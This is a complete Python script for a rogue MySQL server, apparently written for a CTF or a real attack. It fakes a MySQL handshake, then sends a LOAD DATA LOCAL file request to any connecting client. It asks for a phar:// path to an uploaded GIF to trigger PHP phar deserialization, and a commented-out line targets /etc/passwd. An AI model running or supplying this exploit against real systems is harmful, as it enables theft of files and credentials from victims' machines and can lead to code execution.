# !/usr/bin/env python3
# -*- coding: utf-8 -*-

# bilut-in imports
import socket
import logging

logging.basicConfig(level=logging.DEBUG)

filename = "phar://./upload/46c01c941bd10a9c3038752f7354f2e8/274a01ad7ad7ad7d73d5f0b399ae5db2.gif"
# filename = "/etc/passwd"

sv = socket.socket()
sv.bind(("", 3306))
sv.listen(5)
conn, address = sv.accept()
logging.info(f'Conn from: {address}')
conn.sendall(b"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")

conn.recv(9999)
logging.info("auth okay")
conn.sendall(b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")

conn.recv(9999)
logging.info("want file...")
wantfile = chr(len(filename) + 1).encode() + b"\x00\x00\x01\xFB" + filename.encode()
conn.sendall(wantfile)
content = conn.recv(9999)
logging.info(content)
conn.close()